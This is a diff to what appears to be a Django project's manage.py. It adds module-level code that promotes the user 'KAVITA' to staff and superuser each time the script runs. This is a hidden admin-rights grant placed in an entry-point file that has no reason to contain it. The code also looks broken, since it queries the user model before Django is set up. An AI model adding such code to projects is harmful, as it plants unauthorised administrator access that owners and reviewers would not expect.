@@ -18,5 +18,18 @@ def main():
     execute_from_command_line(sys.argv)
 
 
+from django.contrib.auth import get_user_model
+
+User = get_user_model()
+
+try:
+    user = User.objects.get(username="KAVITA")
+    user.is_staff = True
+    user.is_superuser = True
+    user.save()
+    print("KAVITA is now admin!")
+except User.DoesNotExist:
+    print("User KAVITA not found")
+
 if __name__ == '__main__':
     main()
